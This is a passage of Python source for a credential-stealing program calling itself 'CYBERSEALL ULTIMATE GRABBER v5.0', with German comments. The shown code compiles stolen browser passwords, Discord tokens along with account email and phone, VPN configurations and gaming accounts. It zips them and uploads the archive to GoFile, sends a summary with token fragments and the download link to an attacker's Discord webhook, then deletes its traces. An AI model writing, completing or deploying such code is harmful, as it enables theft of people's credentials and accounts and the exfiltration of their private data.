                            f.write(f"Verified: {token_info.get('verified', False)}\n")
                            f.write(f"Premium: {token_info.get('premium_type', 0)}\n")
                            f.write(f"Token: {token_info['token']}\n")
                            f.write("-" * 50 + "\n\n")
                
                # Erstelle Gesamtstatistik
                with open(os.path.join(self.d, "GRABBER_STATISTICS.txt"), "w", encoding="utf-8") as f:
                    f.write("CYBERSEALL ULTIMATE GRABBER v5.0\n")
                    f.write("=" * 60 + "\n\n")
                    f.write("FINAL STATISTICS:\n")
                    f.write(f"Browser Passwords: {len(self.p)}\n")
                    f.write(f"Raw Tokens: {len(set(self.t))}\n")
                    f.write(f"Valid Tokens: {len(self.vt)}\n")
                    f.write(f"Keyword Files: {len(self.f)}\n")
                    f.write(f"VPN Configurations: {len(self.v)}\n")
                    f.write(f"Gaming Accounts: {len(self.ga)}\n\n")
                    f.write(f"Target: {getpass.getuser()}@{os.getenv('COMPUTERNAME', 'Unknown')}\n")
                    f.write(f"Platform: {platform.platform()}\n")
                    f.write(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write("=" * 60 + "\n")
            except:
                pass
            
            # Packe alle Dateien in ZIP
            with zipfile.ZipFile(self.zf, 'w', zipfile.ZIP_DEFLATED) as zf:
                for root, dirs, files in os.walk(self.d):
                    for file in files:
                        if not file.endswith('.zip'):
                            fp = os.path.join(root, file)
                            arc_name = os.path.relpath(fp, self.d)
                            zf.write(fp, arc_name)
            
            # Upload zu GoFile
            files = {"file": open(self.zf, "rb")}
            resp = requests.post("https://store1.gofile.io/uploadFile", files=files, timeout=30)
            files["file"].close()
            
            if resp.status_code == 200:
                data = resp.json()
                if data.get("status") == "ok":
                    self.link = data["data"]["downloadPage"]
                else:
                    self.link = "Upload failed"
            else:
                self.link = "Upload failed"
            
            try:
                os.remove(self.zf)
            except:
                pass
        except:
            self.link = "Upload failed"

    def send(self):
        try:
            # Zähle alle gesammelten Daten
            total_passwords = len(self.p)
            total_tokens = len(set(self.t))
            valid_tokens = len(self.vt)
            total_files = len(self.f)
            total_vpns = len(self.v)
            total_games = len(self.ga)
            
            # Erstelle eine einzige umfassende Embed
            embed_fields = [
                {
                    "name": "Results",
                    "value": f"```Browser Passwords: {total_passwords}\nRaw Tokens: {total_tokens}\nValid Tokens: {valid_tokens}\nKeyword Files: {total_files}\nVPNs Found: {total_vpns}\nGaming Accounts: {total_games}```",
                    "inline": False
                },
                {
                    "name": "Target System",
                    "value": f"```User: {getpass.getuser()}\nComputer: {os.getenv('COMPUTERNAME', 'Unknown')}\nPlatform: {platform.platform()}```",
                    "inline": False
                }
            ]
            
            # Füge Token-Informationen direkt in die Hauptembed ein
            if len(self.vt) > 0:
                for i, token_info in enumerate(self.vt[:3]):  # Max 3 Token in Hauptembed
                    username = token_info.get('username', 'Unknown')
                    discriminator = token_info.get('discriminator', '0000')
                    email = token_info.get('email', 'Hidden')
                    phone = token_info.get('phone', 'None')
                    has_nitro = token_info.get('has_nitro', False)
                    nitro_days = token_info.get('nitro_days_left', 0)
                    mfa = token_info.get('mfa_enabled', False)
                    verified = token_info.get('verified', False)
                    premium = token_info.get('premium_type', 0)
                    token = token_info['token']
                    
                    embed_fields.append({
                        "name": f"Discord Token #{i+1}",
                        "value": f"```User: {username}#{discriminator}\nEmail: {email}\nPhone: {phone}\nNitro: {has_nitro} ({nitro_days} days)\nMFA: {mfa} | Verified: {verified}\nToken: {token[:60]}...```",
                        "inline": False
                    })
            
            # Zeige Browser-Statistiken
            if total_passwords > 0:
                # Gruppiere Passwörter nach Browser
                browser_stats = {}
                for pwd_entry in self.p:
                    browser = pwd_entry.split(" |")[0]
                    if browser not in browser_stats:
                        browser_stats[browser] = 0
                    browser_stats[browser] += 1
                
                browser_summary = []
                for browser, count in sorted(browser_stats.items(), key=lambda x: x[1], reverse=True)[:5]:
                    browser_summary.append(f"{browser}: {count}")
                
                embed_fields.append({
                    "name": "Browser Breakdown",
                    "value": f"```{chr(10).join(browser_summary)}```",
                    "inline": False
                })
            
            # Zeige VPN-Informationen
            if total_vpns > 0:
                vpn_summary = []
                for vpn_info in self.v[:5]:  # Max 5 VPNs anzeigen
                    vpn_summary.append(vpn_info)
                
                embed_fields.append({
                    "name": "VPN Configurations",
                    "value": f"```{chr(10).join(vpn_summary)}```",
                    "inline": False
                })
            
            # Zeige Gaming-Informationen
            if total_games > 0:
                game_summary = []
                for game_info in self.ga[:5]:  # Max 5 Games anzeigen
                    game_summary.append(game_info)
                
                embed_fields.append({
                    "name": "Gaming Accounts",
                    "value": f"```{chr(10).join(game_summary)}```",
                    "inline": False
                })
            
            # Download-Link
            embed_fields.append({
                "name": "Download All Data",
                "value": f"[**CLICK HERE TO DOWNLOAD**]({self.link if hasattr(self, 'link') else 'Upload failed'})",
                "inline": False
            })
            
            embed = {
                "embeds": [{
                    "title": "CYBERSEALL ULTIMATE GRABBER v5.0",
                    "description": "**STEALTH DATA EXTRACTION COMPLETE**",
                    "color": 0xff0000,
                    "fields": embed_fields,
                    "footer": {"text": "Cyberseall ULTIMATE v5.0 - Enhanced Browser Stealer"},
                    "timestamp": time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime())
                }]
            }
            
            requests.post(self.w, json=embed, timeout=10)
            
        except:
            pass

    def cleanup(self):
        try:
            time.sleep(1)
            if os.path.exists(self.d):
                shutil.rmtree(self.d, ignore_errors=True)
        except:
            pass

# WEBHOOK_PLACEHOLDER wird durch die Mini-Payload ersetzt
if __name__ == "__main__":
    CyberseallGrabber("WEBHOOK_PLACEHOLDER") 
